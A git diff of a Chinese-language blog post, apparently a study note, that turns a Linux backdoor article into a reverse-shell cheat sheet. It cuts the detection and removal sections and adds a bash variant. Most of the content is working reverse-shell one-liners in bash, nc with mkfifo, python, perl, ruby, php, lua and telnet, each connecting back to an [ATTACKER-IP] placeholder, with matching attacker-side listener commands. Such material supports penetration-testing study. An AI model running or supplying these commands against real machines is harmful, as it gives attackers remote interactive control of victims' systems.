@@ -1,42 +1,24 @@
 ---
-title: Linux 后门攻防实践
+title: Linux 反弹shell实践
 category: Sec
 ---
 
-## Linux 后门攻防实践
+## Linux 反弹shell实践
 
 ### 0x00 前述
 
-后门作为`post penetration`用于维持访问的主要手段，往往五花八门。从最简单的`shell`、`reverse shell`到`rootkit`，十分丰富。
+在很多渗透场景下我们都需要反弹shell。
 
-后门有优劣之分。一般来说，我们希望后门尽可能多地具有以下几个功能（特点）：
-
-- 提供一个远程攻击者能够随时使用的`root shell`
-- 在靶机上能够具有良好的隐蔽性
-- 与远程攻击者之间的通信具有良好的隐蔽性
-- 提供的`root shell`具有访问控制功能（不能被其他攻击者使用）
-- 安装过程不那么繁琐
-
-当然，靶机环境的千差万别这一客观因素也导致后门的使用需要根据具体环境来安排。
-
-我们对后门的安装时间点（或者说是渗透结束，准备做`post penetration`）做以下定义：
-
-**攻击者使用一些渗透方式（如远程缓冲区溢出，本地提权等），已经获得靶机上的root权限（能够暂时性地与一个`root shell`交互）。**
-
-本文将对一些后门从`攻`、`防`两个角度进行实践。对于一些简单的后门将说明其原理；对于一些复杂的后门，如较为高级的`rootkits`等，将另起文章进行说明。
-
-### 0x01 shell&反弹shell
-
-首先提一下`shell`和`反弹shell`。严格来说这两者本身并不具备维持访问的功能，仅仅提供一个shell。但是如果把它们和一些其他的工具结合，如`crontab`或`nohup`等，就能构成后门。这里的`shell`指的是靶机监听某端口，一旦有外部流量接入就分配一个shell；`反弹shell`则指攻击者的机器上监听某端口，靶机主动去连接这个端口并分配给攻击者一个shell。
+这里的`shell`指的是靶机监听某端口，一旦有外部流量接入就分配一个shell；`反弹shell`则指攻击者的机器上监听某端口，靶机主动去连接这个端口并分配给攻击者一个shell。
 
 `反弹shell`在以下两种环境中具有独特优势：
 
 1. 靶机没有公网IP（或者说，没有能够直接被攻击者访问到的IP）
 2. 靶机本身或所在网络的防火墙对出口流量不做限制或限制小
 
-#### 0x010 shell
+网络上已经有很多关于这方面的文章。本文为学习笔记。
 
-#### 0x011 反弹shell：bash
+### 0x01 反弹shell：bash
 
 ```bash
 // Step1: Attacker
@@ -57,7 +39,7 @@ bash -i >& /dev/tcp/[ATTACKER-IP]/10000 0>&1
 
 **原理**
 
-#### 0x012 反弹shell：nc
+### 0x02 反弹shell：nc
 
 对于靶机上的`nc`能够通过`-e`方式执行shell的情况不再叙述，大部分靶机可能都不能用`-e`选项。这里考察`-e`选项不能使用的情况。
 
@@ -80,7 +62,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER-IP] 10000 >/tmp/
 
 **原理**
 
-#### 0x013 反弹shell：python
+### 0x03 反弹shell：python
 
 ```bash
 // Step1: Attacker
@@ -101,7 +83,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 **原理**
 
-#### 0x014 反弹shell：perl
+### 0x04 反弹shell：perl
 
 ```bash
 // Step1: Attacker
@@ -122,7 +104,7 @@ perl -e 'use Socket;$i="[ATTACKER-IP]";$p=10000;socket(S,PF_INET,SOCK_STREAM,get
 
 **原理**
 
-#### 0x015 反弹shell：ruby
+### 0x05 反弹shell：ruby
 
 ```bash
 // Step1: Attacker
@@ -143,7 +125,7 @@ ruby -rsocket -e'f=TCPSocket.open("[ATTACKER-IP]",10000).to_i;exec sprintf("/bin
 
 **原理**
 
-#### 0x016 反弹shell：php
+### 0x06 反弹shell：php
 
 ```bash
 // Step1: Attacker
@@ -166,7 +148,7 @@ php -r '$sock=fsockopen("[ATTACKER-IP]",10000);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 **原理**
 
-#### 0x017 反弹shell：lua
+### 0x07 反弹shell：lua
 
 ```bash
 // Step1: Attacker
@@ -187,7 +169,7 @@ apt-get install lua5.2
 lua: (command line):1: module 'socket' not found:
 ```
 
-#### 0x017 反弹shell：telnet
+### 0x08 反弹shell：telnet
 
 ```bash
 // Step1: Attacker
@@ -210,21 +192,32 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet [ATTACKER-IP] 10000 >/
 
 与`nc`中的原理相同，只是把`nc`换成了`telnet`。
 
-### 0x02 后门部署实践
+### 0x09 反弹shell：bash-2
 
-### 0x03 后门检测与清除实践
+```bash
+// Step1: Attacker
+ncat -l -p 10000
+// Step2: Victim
+exec 5<>/dev/tcp/[ATTACKER-IP]/10000;cat <&5 | while read line; do $line 2>&5 >&5; done
+```
 
-### 0x04 参考
+靶机截图：
 
-- [Linux下的icmp shell后门](http://vinc.top/2016/06/06/linux%E4%B8%8B%E7%9A%84icmp-shell%E5%90%8E%E9%97%A8/)
-- [Linux后门](http://rcoil.me/2017/04/Linux%E5%B0%8F%E5%90%8E%E9%97%A8/)
-- [Linux后门技术研究之ping后门](http://www.weixianmanbu.com/article/186.html)
-- [linux后门N种姿势](http://www.vipread.com/library/item/594)
-- [Linux后门整理合集（脉搏推荐）](https://www.secpulse.com/archives/59674.html)
-- [Linux渗透之OpenSSH后门](http://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/%E6%B5%8B%E8%AF%95/2017/09/26/Linux%E6%B8%97%E9%80%8F%E4%B9%8BOpenSSH%E5%90%8E%E9%97%A8.html)
-- [Linux软连接ssh后门之我见](http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/)
+![]({{ site.url }}/images/linux-backdoor/bash-reverse-15.png)
+
+攻击者截图：
+
+![]({{ site.url }}/images/linux-backdoor/bash-reverse-14.png)
+
+这个反弹shell的管道功能和重定向功能有问题。
+
+**原理**
+
+### 0x0A 参考
+
 - [linux下反弹shell的几种方法](http://blog.csdn.net/u012985855/article/details/64117187?utm_source=itdadao&utm_medium=referral)
 - [Linux下反弹shell笔记](https://www.cnblogs.com/deen-/p/7237327.html)
 - [关于Linux的反弹shell命令的解析](http://os.51cto.com/art/201709/550457.htm)
 - [Linux下反弹shell方法](https://www.waitalone.cn/linux-shell-rebound-under-way.html)
 - [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [Reverse Shell with Bash](http://www.gnucitizen.org/blog/reverse-shell-with-bash/)
